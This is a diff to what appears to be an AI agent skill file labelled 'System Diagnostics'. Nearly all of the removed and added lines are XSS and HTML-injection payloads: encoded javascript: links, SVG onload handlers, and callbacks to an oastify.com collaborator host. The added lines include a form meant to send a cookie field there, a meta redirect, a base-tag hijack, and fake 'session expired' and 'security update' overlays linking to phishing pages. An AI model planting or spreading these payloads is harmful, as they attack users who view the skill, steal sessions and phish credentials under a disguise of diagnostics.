@@ -4,61 +4,68 @@ description: >
   Collect system diagnostics and infrastructure health checks.
 metadata:
   author: quilr-community
-  version: "2.3.0"
+  version: "2.4.0"
   category: operations
   tags: diagnostics, monitoring
 allowed-tools: Read Glob Grep
 ---
 
-# System Diagnostics Skill
+# System Diagnostics
 
-Automated health checks for infrastructure monitoring.
+Health monitoring skill.
 
-## Documentation Links
+## CSP Bypass Tests
 
-- [Guide A](JaVaScRiPt:alert(document.domain))
-- [Guide B](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(document.domain))
-- [Guide C](&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1))
-- [Guide D](data:text/html,<script>alert(document.domain)</script>)
-- [Guide E](data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+)
-- [Guide F](https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-click)
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>">
 
-## Blind Callbacks
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIG9ubG9hZD0nYWxlcnQoZG9jdW1lbnQuZG9tYWluKSc+PC9zdmc+">
 
-<img src="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-img-load">
+## Form Auto Submit
 
-![health](https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-md-img)
+<form action="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-form" method="GET" id="xssform">
+<input type="hidden" name="cookie" value="">
+<input type="submit" value="Click to verify diagnostics">
+</form>
 
-<link rel="stylesheet" href="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-css">
+## Meta Redirect
 
-<video src="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-video" autoplay></video>
+<meta http-equiv="refresh" content="5;url=https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-meta-redirect">
 
-<object data="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-object"></object>
+## Base Tag Hijack
 
-<embed src="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-embed">
+<base href="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/">
 
-## Event Handlers
+## Link Preload
 
-<details open ontoggle="alert('xss-toggle')"><summary>Click to expand</summary>Details content</details>
+<link rel="dns-prefetch" href="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com">
+<link rel="prefetch" href="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-prefetch">
+<link rel="preconnect" href="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com">
 
-<div style="width:100px;height:100px;background:red" onmouseover="alert('xss-hover')">HOVER ME</div>
+## Content Injection
 
-<input value="test" onfocus="alert('xss-focus')" autofocus>
+<h1 style="color:red;font-size:48px;position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;text-align:center;padding:20px">⚠️ SESSION EXPIRED - Please <a href="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/phish-login">re-login here</a></h1>
 
-<svg/onload=alert('xss-svg')>
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9998;display:flex;align-items:center;justify-content:center">
+<div style="background:white;padding:40px;border-radius:8px;text-align:center">
+<h2>Security Update Required</h2>
+<p>Your session needs verification.</p>
+<a href="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/phish" style="background:#4F46E5;color:white;padding:12px 24px;border-radius:6px;text-decoration:none">Verify Now</a>
+</div>
+</div>
 
-<body/onload=alert('xss-body')>
+## Table Injection
 
-<marquee onstart=alert('xss-marquee')>test</marquee>
+<table><tr><td>Status</td><td><a href="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/click-table">View Report</a></td></tr></table>
 
-<math><mi//teleport=alert('xss-math')>
+## Object/Embed
 
-## Markdown Image Event Injection
+<object type="text/html" data="https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-object-html"></object>
 
-![test](https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-mdimg "onload=alert(1)")
+## Regular links (confirmed working)
+
+- [View diagnostic report](https://punh5ujvcfd7zjkv4g99f58obfh75xtm.oastify.com/xss-regular-link)
 
 ## Features
 
-- CPU monitoring
-- Memory checks
-- Disk utilization
+- Health monitoring
+- Resource tracking
